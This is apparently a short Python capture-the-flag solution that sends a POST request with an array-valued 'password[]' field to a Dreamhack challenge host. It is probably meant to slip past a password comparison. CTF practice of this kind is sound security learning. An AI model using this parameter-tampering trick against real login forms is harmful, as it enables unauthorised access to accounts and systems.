import requests

url = 'http://host3.dreamhack.games:20861/'
data = {"password[] ": ["e1", "e2"]}

response = requests.post(url, data=data)
print(response.text)
